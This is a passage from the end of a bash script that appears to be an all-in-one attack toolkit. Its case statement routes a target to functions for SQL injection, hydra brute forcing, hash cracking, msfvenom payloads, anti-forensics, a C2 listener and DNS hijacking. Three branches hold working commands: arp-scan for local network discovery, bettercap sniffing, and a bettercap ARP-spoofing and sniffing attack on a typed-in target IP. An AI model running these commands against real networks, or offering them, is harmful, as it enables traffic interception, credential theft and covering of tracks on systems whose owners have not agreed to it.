    FUZZ) web_fuzz "$TARGET" ;;
    WPSCAN) wp_audit "$TARGET" ;;
    RUSTSCAN) rust_scan "$TARGET" ;;
    SUBFINDER) sub_discover "$TARGET" ;;
    SQLMAP) sql_inject "$TARGET" ;;
    BREACH) breach_search "$TARGET" ;;
    TAKEOVER) takeover_check "$TARGET" ;;
    ORIGIN) origin_find "$TARGET" ;;
    EMPLOYEES) employee_recon "$TARGET" ;;
    SUPPLY) supply_audit "$TARGET" ;;
    DORKS) github_dork "$TARGET" ;;
    SECRETS_DEEP) api_deep_extract "$TARGET" ;;
    INTERNAL) internal_enum "$TARGET" ;;
    BRUTE) hydra_brute "$TARGET" ;;
    CRACK) hash_crack "$TARGET" ;;
    PAYLOAD) msf_venom "$TARGET" ;;
    SHODAN) api_intel "$TARGET" ;;
    YARA) yara_scan "$TARGET" ;;
    HONEYPOT) honeypot_trap "$TARGET" ;;
    ANTI_FORENSICS) anti_forensics ;;
    C2_LISTENER) c2_listener ;;
    DNS_HIJACK) dns_hijack ;;
    CLOUD) cloud_recon "$TARGET" ;;
    FILE) exiftool "$TARGET" | grep -v "Directory" ;;
    NET)
        INTERFACE=$(ip route get 8.8.8.8 | awk '{print $5; exit}')
        sudo arp-scan --interface=$INTERFACE --localnet --retry=5 --ignoredups ;;
    SNIFF) sudo bettercap -eval "net.probe on; net.sniff on" ;;
    KILL) echo -ne "Target IP: "; read t; sudo bettercap -eval "set arp.spoof.targets $t; arp.spoof on; net.sniff on" ;;
    MAC) ghost_mode ;;
esac

echo -e "\n\e[1;34m========================================================\e[0m"
